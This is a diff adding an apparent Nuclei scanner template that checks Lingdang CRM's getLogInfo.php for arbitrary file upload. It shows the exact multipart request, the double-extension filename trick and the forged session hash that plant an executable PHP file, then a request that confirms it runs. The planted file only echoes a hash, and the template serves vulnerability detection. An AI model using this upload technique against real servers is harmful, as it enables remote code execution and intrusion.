@@ -1,0 +1,55 @@
+id: poc-yaml-51mis-crm-getloginfo-php-anyfile-upload
+info:
+  name: Lingdang CRM getLogInfo.php Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Lingdang CRM getLogInfo.php is vulnerable to arbitrary file upload which can lead to remote code execution.
+
+variables:
+  t1: "{{rand_int(100,100000)}}"
+  t3: "{{md5(t1)}}"
+  dt1: "{{date_time('2006')}}"
+  dt2: "{{date_time('01')}}"
+  dt3: "{{date_time('02')}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/crm/WeiXinApp/CallRecordLog/getLogInfo.php?userid=&gettype=uploadfile&uploadfilename={{t1}}.php......&callednumber=&sessionvalue={{md5(concat('uploadfile', t1,'.php......'))}}"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj"
+    body: |-
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="uploaded_file"; filename="798.avi"
+      Content-Type: image/jpeg
+
+      <?php echo md5({{t1}});unlink(__FILE__);?>
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "success"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/crm/storage/mobilecalllog/{{dt1}}/{{dt2}}/{{dt3}}/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t3}}"
